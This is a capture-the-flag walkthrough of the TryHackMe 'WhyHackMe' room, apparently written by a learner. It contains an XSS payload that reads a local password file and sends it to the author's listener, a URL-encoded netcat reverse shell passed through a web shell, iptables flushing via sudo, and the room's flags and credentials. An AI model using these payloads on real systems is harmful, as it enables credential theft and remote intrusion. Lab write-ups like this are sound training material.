@@ -1,0 +1,168 @@
+----------------------WHYHACKME ROOM ----------------------
+Link : https://tryhackme.com/r/room/whyhackme
+Dte: 07-12-2024
+Level: Mediuim
+Ip : 10.10.180.240 --> whyhackme.thm
+
+
+------------Enumeration of  machine , ports and services
+--> nmap -sC -sV 10.10.180.240 -T4 > nmap.txt
+	21 --> FTP --> Anonymous logon allowed
+	22 --> SSH
+	80 --> HTTP --> A blog found there with a login page
+
+
+---------Port 21 Enumeration (FTP)
+After connecting myself with Anonymous creednnntials, i get a file named update.txt. Look at his content:
+
+Hey I just removed the old user mike because that account was compromised and for any of you who wants the 			creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
+- admin
+
+This mesaage tell us that it have the password of one account there, SO we have tro usernames
+username1 : admin
+Username2 : mike
+Password_place: /dir/pass.txt
+
+The problem here is that we don't have access  to this directory directly and i have to connect myself before.
+
+------------Port 80 Enumeration (HTTP)
+It in this that i start a directry scanning to see
+--> gobuster dir -u http://10.10.180.240/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100
+	--> /dir --> forbiden
+	--> /assets --> just css files 
+	--> server_status --> forbiden
+So for the dir enum i found nothing. let check something else.
+
+As i see last time blog.php i will try launching a gobuster with php extension
+
+That is what i found 
+index.php            (Status: 200) [Size: 563]
+/.php                 (Status: 403) [Size: 277]
+/login.php            (Status: 200) [Size: 523]
+/blog.php             (Status: 200) [Size: 3102]
+/register.php         (Status: 200) [Size: 643]
+/dir                  (Status: 403) [Size: 277]
+/assets               (Status: 301) [Size: 313]
+
+i create my account and after i logges in. Wheh it was done, i try to put a comment and after delete it i think i can inject sth in the comment area but i don't know what because i inject based xss payload ans it not work.
+
+At the end we noticed that the xss payload might be injected as username.
+
+Payload: <script>fetch("http://127.0.0.1/dir/pass.txt").then(r => r.text()).then(t => fetch("http://10.2.9.70:8000?q="+t,{mode:"no-cors"}))</script>
+
+Before creating the user with this username, i create a python server on port 8000. When i finishef and wrote my comment see the answer.
+
+python3 -m http.server 8000                            
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.166.25 - - [09/Dec/2024 04:46:03] "GET /?q=jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 200 -
+
+
+so we have username and password we will connect ourselves with SSH.
+
+jack@ubuntu:~$ cat user.txt
+	1ca4eb201787acbfcf9e70fca87b866a
+jack@ubuntu:~$ sudo -l
+	[sudo] password for jack: 
+	Matching Defaults entries for jack on ubuntu:
+	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+	User jack may run the following commands on ubuntu:
+    (ALL : ALL) /usr/sbin/iptables
+jack@ubuntu:~$ 
+
+
+So now we will try privilege escalation .
+
+First i try to see all rules set with iptables 
+-->sudo iptables -L
+	Chain INPUT (policy ACCEPT)
+	target     prot opt source               destination         
+	DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
+	ACCEPT     all  --  anywhere             anywhere            
+	ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
+	ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
+	ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
+	ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
+	ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
+	DROP       all  --  anywhere             anywhere            
+
+	Chain FORWARD (policy ACCEPT)
+	target     prot opt source               destination         
+
+	Chain OUTPUT (policy ACCEPT)
+	target     prot opt source               destination         
+	ACCEPT     all  --  anywhere             anywhere
+
+
+After that i noticed that port 41312 was blocked or connexion to this port was drop. After that i fulshed all rules with the command 
+
+--> sudo iptable -F
+--> nmap -sC -sV 10.10.37.17 -p 41312 -T4 > nmap_after_iptable-F.txt
+
+
+--> cat nmap_after_iptable-F.txt 
+	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 09:38 EST
+	Nmap scan report for 10.10.37.17
+	Host is up (0.41s latency).
+
+	PORT      STATE SERVICE VERSION
+	41312/tcp open  http    Apache httpd 2.4.41
+	|_http-server-header: Apache/2.4.41 (Ubuntu)
+	|_http-title: 400 Bad Request
+	Service Info: Host: www.example.com
+
+We will try accessing this web service but we get answer : 
+	Bad Request
+
+	Your browser sent a request that this server could not understand.
+	Reason: You're speaking plain HTTP to an SSL-enabled server port.
+	Instead use the HTTPS scheme to access this URL, please.
+	
+	
+As it where opt sourc ewe will try to check in folder /opt.
+-->jack@ubuntu:/opt$ ls -la
+	total 40
+	drwxr-xr-x  2 root root  4096 Aug 16  2023 .
+	drwxr-xr-x 19 root root  4096 Mar 14  2023 ..
+	-rw-r--r--  1 root root 27247 Aug 16  2023 capture.pcap
+	-rw-r--r--  1 root root   388 Aug 16  2023 urgent.txt
+-->jack@ubuntu:/opt$ cat urgent.txt 
+Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
+
+I try to acces to the folder /usr/lib/cgi-bin/ but i don't have permission
+
+I will exfiltrate the pcap file on my machine to see.
+
+After searching in the pcap file, i noticed that the web shell was obtained with this :
+
+https://10.10.37.17:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id
+
+so we will use this to put our revere shell.
+
+https://10.10.37.17:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.2.9.70%201234%20%3E%2Ftmp%2Ff
+
+
+Bingo we gwt the shell and noticed that www-data has all right
+
+ww-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: ALL
+
+
+
+After i just do sudo su and go to cat the root.txt
+
+root@ubuntu:~# cat root.txt
+cat root.txt
+4dbe2259ae53846441cc2479b5475c72
+root@ubuntu:~# 
+
+
+
+
+Thank you for reading my opinion of the room @petstar from togo
